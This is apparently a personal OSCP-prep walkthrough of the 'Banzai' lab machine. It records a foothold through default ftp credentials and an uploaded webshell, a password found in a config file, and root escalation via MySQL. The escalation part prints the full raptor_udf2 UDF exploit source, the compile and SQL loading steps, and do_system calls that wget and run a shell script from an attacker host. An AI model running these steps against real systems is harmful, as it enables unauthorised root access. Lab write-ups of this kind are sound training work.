# Banzai Helped-through
Name: Banzai
Date:  30/10/2022
Difficulty:  Intermediate
Goals:  OSCP Prep
Learnt: 
- Web is a pyschological rabbit hole for me.
- Try default creds on all ftp 
- port numbers because WAF exist!
- mysql has a shell run system commands from mysql:  `\!` 


## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

SSL recently has been a massive headache in alot of my venture in hoping to improve.
![](diffiehellmanvuln.png)  

I downloaded the site, but there is no contact form...

![](noregnacontactform.png)

Found the above very disconcerting as it would hosted elsewhere. Or because its actually the same directory as ftp. I did loads of recon and exploit hunting, but at the end of the day Web is a pyschological rabbit hole for me on top of potential rabbithole.

## Exploit && Foothold

`admin:admin` on ftp... added this to a list things I am an idiot about. This was a massive ouch moment. I am sure there is a Alhazred quote in the back of my mind *"Sometime it just the ftp..."*. 

![](banzaiftpadmin.png)
![]()
Becuase you are `admin` you can upload a shell and due to it also being the web directory use a webshell. 
![](uploadwebshell.png)

It needs to be port 21, because of [[waf-detect-http___192.168.141.56_8295_-apachegeneric]]
![](revshell.png)

## PrivEsc

I decide to close the walkthrough for the next thirty miniutes. Had more trouble connecting back ...

admin user!

![](passinconfigphp.png)

`EscalateRaftHubris123`

/var/log/mail.log - denied

Why is there an mysql and postgres, and the mysql 
![](3306.png)

Root should never run any service!
![](rootprivmysqlproc.png)
The mysql credentials above then make more sense.

![](raptordotcusage.png)

The first step makes and object file.

```
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc <,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

This was a nice reminder why I like clang.
![](compilation.png)

```
#include <stdio.h>
#include <stdlib.h>
 
enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
 
typedef struct st_udf_args {
        unsigned int arg_count; // number of arguments
        enum Item_result *arg_type; // pointer to item_result
        char **args; // pointer to arguments
        unsigned long *lengths; // length of string args
        char *maybe_null; // 1 for maybe_null args
} UDF_ARGS;
 
typedef struct st_udf_init {
        char maybe_null; // 1 if func can return NULL
        unsigned int decimals; // for real functions
        unsigned long max_length; // for string functions
        char *ptr; // free ptr for func data
        char const_item; // 0 if result is constant
} UDF_INIT;
 
int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
        if (args->arg_count != 1) {
                return(0);
        }
        system(args->args[0]);
        return(0);
}
 
char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
        return(0);
}
```

UDF - User defined functions.

1. Discover where the installation of MySQL stores its UDFs

```sql
show variables like 'plugin_dir';
show variables like 'secure_file_priv';
```

![](sqlinrecon.png)

```sql
use mysql;
create table foo(line blob);
-- Load the shared library file into the table
insert into foo values(load_file('/var/www/raptor_udf2.so'));
-- Dump our table into the live shared library file that mysql is using
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
-- make a function that returns the 0 to shared libary name
create function do_system returns integer soname 'raptor_udf2.so';
-- it because sets our id to 0, therefore root, wow
select do_system('id > /var/www/out; chown www-data.www-data /var/www/out');
\! sh -- run sh from mysql
cat /var/www/out 
```

We run commands as root so we need a another revserve shell
![](notrootyet.png)

I instead of facing the hell hole that is compatiblity and compilation i just transfered a bash  shell.  One day I will finish what is currently named ninjashell to end this nightmare.

```sql
select do_system('wget http://192.168.49.113:8295/shell.sh -O /var/www/shell.sh');
select do_system('chmod 777 /var/www/shell.sh');
select do_system('/var/www/shell.sh');
```

![](whataroot.png)

What a machine. Wow! I learnt alot.